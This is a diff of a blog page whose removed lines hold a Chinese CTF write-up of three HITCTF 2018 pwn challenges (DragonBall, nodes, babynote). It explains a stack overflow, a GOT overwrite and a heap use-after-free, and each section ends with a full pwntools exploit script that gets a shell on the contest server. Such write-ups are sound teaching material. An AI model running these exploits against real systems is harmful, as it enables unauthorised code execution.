-<h2 id="DragonBall"><a href="#DragonBall" class="headerlink" title="DragonBall"></a>DragonBall</h2><h3 id="基本逻辑-2"><a href="#基本逻辑-2" class="headerlink" title="基本逻辑"></a>基本逻辑</h3><p>一个小游戏，一共有15块，要集齐七个龙珠才能许愿，我们能实现的操作有买龙珠、卖龙珠、打印龙珠和对着龙珠许愿：P。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/dragonball_1.png" alt="main"></p>
-<p>买的时候龙珠5块钱一个，但是注意，if里面只判断了money是否为0，并没有判断&gt;0</p>
-<p><img src="/2018/02/07/HITCTF-PWN/dragonball_2.png" alt="buy"></p>
-<p>卖的时候龙珠只有3块钱，但这里在后续我们利用漏洞起到了一定作用。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/dragonball_3.png" alt="sell"></p>
-<p>wish函数里，向v1里读入wish字符串，向v2里读入yes or no，正常人会用这么大的缓冲区放yes和no吗？？v2分配了0x38大小，但是读入的时候读了0x40个字符，也就是说可以有8个字节的缓冲区溢出。v1分配了0x30大小，但是读入的时候读了0x68个字节。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/dragonball_4.png" alt="wish"></p>
-<h3 id="漏洞-2"><a href="#漏洞-2" class="headerlink" title="漏洞"></a>漏洞</h3><p>首先，buy函数里，只要money不是0，是负数也无所谓，可以无穷尽的买卖，这样很快就能达到7个龙珠了。</p>
-<p>其次，wish函数里v1和v2都可以进行缓冲区溢出。v1读入的0x68个字节可以占用v2的空间，v2读入的0x40正好可以修改返回地址。</p>
-<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>保护机制：喜大普奔！这题没有开NX！也就是可以在栈上写入shell并执行</p>
-<p><img src="/2018/02/07/HITCTF-PWN/dragonball_5.png" alt="checksec"></p>
-<p>利用的思路就是：在v1或v2的位置写入shell，然后要获取栈地址，并将这个地址通过v2写入wish的返回地址，最后wish返回之后就能直接执行shell。</p>
-<p>其余都好弄，就是如何获取栈上的地址。在gdb调试过程中，通过查看栈，发现此时ebp的值为0xffffc818，向上两个单元中的值总是和ebp相差0x10，而这个位置正好可以通过读取v1来得到，这样就得到了栈上的地址。可以发现，wish中会将v1中的内容打印出来（Your wish is %s…）。由此，先将v1中这个位置之前的内容都填满，共0x68-8=0x60个字节，其中包含着可执行的shell；然后再通过v2将返回地址的位置填上v1的地址即可。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/dragonball_6.png" alt="gdb"></p>
-<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./DragonBall'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.132.82'</span>,<span class="number">40002</span>)</span><br><span class="line"><span class="comment">#buy dragonball</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">	p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">	p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#make a wish</span></span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Tell me your wish: '</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Your wish is '</span>)</span><br><span class="line">p.recv(<span class="number">0x60</span>)</span><br><span class="line">stack_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">wish_addr = stack_addr<span class="number">-0x10</span><span class="number">-0x68</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"wish_addr:0x%x"</span>%wish_addr</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'is it right?\n(Y/N) '</span>)</span><br><span class="line">payload = <span class="number">60</span>*<span class="string">'a'</span>+p32(wish_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="nodes"><a href="#nodes" class="headerlink" title="nodes"></a>nodes</h2><h3 id="基本逻辑-3"><a href="#基本逻辑-3" class="headerlink" title="基本逻辑"></a>基本逻辑</h3><p>主要是对一个单向链表上的节点进行操作。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/nodes_1.png" alt="main"></p>
-<p>set_size函数是对BSS段上的一个值进行初始化，设置为48，这个字段后续要作为read函数的第三个参数。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/nodes_2.png" alt="set_size"></p>
-<p>main函数中限定了节点数最多为149.</p>
-<p>add_node函数，首先判断头节点是否存在，如果存在，就通过后向指针循环寻找下一节点，直到找到链表的尾部，添加新的节点；如果不存在，就构建头节点后再添加新的节点。 这里可以看见，read函数的第三个参数就是之前set_size函数里设置为48的那个字段unk_804a080。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/nodes_3.png" alt="add_node"></p>
-<p>通过add_node函数，可以了解到每一个节点的结构如下：</p>
-<p><img src="/2018/02/07/HITCTF-PWN/nodes_4.png" alt="nodes_structure"></p>
-<p>edit_node函数通过value作为索引，找到对应节点，修改其data内容。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/nodes_5.png" alt="edit_node"></p>
-<p>print_node顺序打印链表中每个节点的value和data。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/nodes_6.png" alt="print_node"></p>
-<h3 id="漏洞-3"><a href="#漏洞-3" class="headerlink" title="漏洞"></a>漏洞</h3><p>说实话，这题的漏洞对我隐藏的太深了，我大概看了三个小时才找到漏洞。</p>
-<p>main函数中的case 1，会打印已有的节点数，其中这个byte_904a060是一个bss段上的字段。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(byte_804A060, <span class="string">"You have already insert %d nodes"</span>, nodes_num);</span><br></pre></td></tr></table></figure>
-<p>在bss段找到它，发现它实际分配了32字节的空间。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/nodes_7.png" alt=""></p>
-<p>数一下You have already insert XXX nodes字符串，如果nodes_num是3位数，那么字符串长度为33位，也就是说，当添加的节点数大于等于100时就会触发堆溢出漏洞。从上图能够看出，byte_904a060之后正好就是 unk_804a080,就是最开始设置为48的read参数，一旦堆溢出，byte_904a060的最后一个字符s就会覆盖 unk_804a080，即read可以读入的字符串长度变成0x73，覆盖next指针的值，再次调用print_node时就会泄露内存。</p>
-<h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>system函数地址的泄露</strong>：首先申请100个节点，这时会造成堆溢出漏洞。这样read的第三个参数变得很大，通过edit_node将第99个节点的next指针覆写为puts函数的got表地址。再调用print_node时，第100个节点的地址就会变为puts函数的got表地址puts@got，打印出来的value也就是当前puts函数的真实地址。再通过libc中puts与system的相对便宜进一步得到system函数地址。再通过edit_node操作第100个节点，修改puts@got中的内容为system函数地址。</p>
-<p><strong>system函数调用</strong>： 当程序中调用puts时就相当于调用了system函数，可以事先在第一个节点的data中写入/bin/sh参数，当调用print_node时，触发puts(data)，即执行了system(‘/bin/sh’)</p>
-<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x0804A024</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./nodes'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.local.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.132.82'</span>,<span class="number">40003</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add 100</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Value:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">101</span>):</span><br><span class="line">	<span class="comment">#time.sleep(1)</span></span><br><span class="line">	p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Value:'</span>)</span><br><span class="line">	p.sendline(str(i))</span><br><span class="line">	p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">	p.sendline(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit no.99</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Node's value:"</span>)</span><br><span class="line">p.sendline(<span class="string">'99'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'New value:'</span>)</span><br><span class="line">p.sendline(<span class="string">'99'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'New data:'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">48</span> + p32(puts_got))</span><br><span class="line"></span><br><span class="line"><span class="comment">#list -&gt; leak puts_addr</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Your nodes:"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	p.recvuntil(<span class="string">'Value:'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Value:'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = int(p.recv(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr:0x%x"</span> %puts_addr</span><br><span class="line"></span><br><span class="line">system_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"sys_addr:0x%x"</span> %system_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit 100</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Node's value:"</span>)</span><br><span class="line">p.sendline(str(puts_addr))</span><br><span class="line">p.recvuntil(<span class="string">'New value:'</span>)</span><br><span class="line">p.sendline(str(system_addr))</span><br><span class="line">p.recvuntil(<span class="string">'New data:'</span>)</span><br><span class="line">p.sendline(p32(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#list</span></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h2><h3 id="基本逻辑-4"><a href="#基本逻辑-4" class="headerlink" title="基本逻辑"></a>基本逻辑</h3><p>菜单类的题目，可以添加、编辑、删除和打印note。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/babynote_1.png" alt="main"></p>
-<p>add函数限定了note数量最多为3。通过add函数，能够看出程序管理每一块note的方法：有一个list数组用于存放每一个note的首地址，每一个note的大小是12字节，依次存放note中content的大小、content的地址和puts函数地址。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/babynote_2.png" alt="add"></p>
-<p><img src="/2018/02/07/HITCTF-PWN/babynote_3.png" alt=""></p>
-<p><img src="/2018/02/07/HITCTF-PWN/babynote_4.png" alt=""></p>
-<p>edit函数通过note的编号作为索引修改content的内容。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/babynote_5.png" alt=""></p>
-<p>prints函数调用每一个note中的第三个字段（正常来说是puts函数地址）来打印每一个note的内容。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/babynote_6.png" alt=""></p>
-<p>delete函数释放note的content地址空间和note地址空间，然而并没有将指针置0.</p>
-<p><img src="/2018/02/07/HITCTF-PWN/babynote_7.png" alt=""></p>
-<h3 id="漏洞-4"><a href="#漏洞-4" class="headerlink" title="漏洞"></a>漏洞</h3><p>在delete函数中，被释放的指针没有置空，导致UAF（use after free）漏洞，即可以对已释放的内继续进行操作。</p>
-<h3 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>非常不巧，本题开了PIE保护，即程序的地址也不再是固定不变的了，漏洞的利用变得更加困难。</p>
-<p><strong>system函数的地址泄露：</strong></p>
-<p>涉及了一个新的知识点：main_arena。main_arena存在于libc的BSS段中，用于存放各种bin的头结点信息，如fastbin，smallbin和unsortedbin等。本题中，当最开始add了一个note，并设置content大小为一个大于64字节的数（例如100），再delete这个note时，这一块内存会首先放入unsortedbin当中，并将FD和BK设置为main_arena中unsortedbin的头结点地址。</p>
-<p>可以通过调试查看，在100字节的content没有被释放时，main_arena的结构是这样的：</p>
-<p><img src="/2018/02/07/HITCTF-PWN/babynote_9.jpg" alt=""></p>
-<p>释放这个note之后，main_arena如下：</p>
-<p><img src="/2018/02/07/HITCTF-PWN/babynote_8.jpg" alt=""></p>
-<p>其中bins里存放的就是各类型的bin头结点的地址，发现0x5824b010就是unsortedbin头结点的地址，查看0x5824b010，就能看见刚刚释放的content 地址。</p>
-<p><img src="/2018/02/07/HITCTF-PWN/babynote_10.png" alt=""></p>
-<p>因此，system函数的地址泄露可以通过读取已释放的content的前四字节（FD指针）泄露libc的地址，进而泄露system的地址。</p>
-<p><strong>system函数的覆写和调用：</strong></p>
-<p>本题中note固定占用12字节，属于fastbin。当某一content正好也要申请12字节空间时，系统会先再fastbin上寻找是否有大小相同的chunk，如果有就会直接分配给content。如果这个chunk是之前释放的note，那么利用UAF漏洞，就可以修改内存。</p>
-<p>先申请第一个note(note#0)，其content大小为100字节。再申请第二个note(note#1)，其content(content#1)大小为12字节。释放note #1和note #0。由于fastbin是LIFO的原则，此时fastbin上的chunk顺序为：note#0-&gt;note#1-&gt;content#1。此时再申请第三个note(note #2)，并要求content也为12，系统从fastbin中顺序摘下大小为12的chunk进行分配，那么note#2对应的就是note#0，content#2对应的就是note #1。</p>
-<p>此时向content#2输入，就会覆写掉note#1原本的内容，将前两个字段写成/bin/sh，第三个字段写成system函数地址；然后再调用prints对note#1操作，就相当于直接调用了system函数。</p>
-<p>PS:在调试过程中可以通过vmmap来查看，FD指针与libc其实地址的相对偏移offset。</p>
-<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./babynote'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.local.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.132.82'</span>,<span class="number">40004</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">offset = <span class="number">0x1b27b0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Content size:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Input the content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Input the index:"</span>)	</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Input the index:"</span>)	</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">"New content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prints</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Input the index:"</span>)	</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">add(<span class="number">100</span>,<span class="string">'a'</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">add(<span class="number">12</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">prints(<span class="number">1</span>)</span><br><span class="line">prints(<span class="number">0</span>)</span><br><span class="line">addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"addr:0x%x"</span> %addr</span><br><span class="line">libc_base = addr - offset</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"sys:0x%x"</span>%sys_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">add(<span class="number">12</span>,<span class="string">'c'</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\0'</span>+p32(sys_addr))</span><br><span class="line"></span><br><span class="line">prints(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -1808,7 +1778,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
